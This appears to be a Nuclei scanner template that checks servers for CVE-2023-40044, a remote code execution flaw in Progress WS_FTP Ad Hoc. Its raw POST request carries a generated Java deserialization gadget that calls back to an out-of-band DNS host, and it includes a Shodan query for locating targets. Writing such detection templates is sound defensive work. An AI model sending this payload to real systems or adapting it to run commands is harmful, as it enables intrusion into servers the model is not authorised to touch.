http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  raw:
  - 'POST /AHT/AhtApiService.asmx/AuthUser HTTP/2

    Host: {{Hostname}}

    Cookie: ASP.NET_SessionId=lilzf4yfwobb5fsaelo5abez

    Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266


    -----------------------------9051914041544843365972754266

    Content-Disposition: form-data; name="";


    ::AHT_DEFAULT_UPLOAD_PARAMETER::{{generate_java_gadget("dns", "https://{{interactsh-url}}",
    "base64")}}

    -----------------------------9051914041544843365972754266---

    '
id: CVE-2023-40044
info:
  author: johnk3r
  classification:
    cve-id: CVE-2023-40044
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
  metadata:
    max-request: 2
    product: ws_ftp_server
    shodan-query: title:"http.favicon.hash:-2136339017"
    vendor: Progress
    verified: true
  name: RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules
  reference:
  - https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023
  - https://nvd.nist.gov/vuln/detail/CVE-2023-40044
  - https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044
  severity: High
  tags: cve,cve2023,ws_ftp,progress,rce
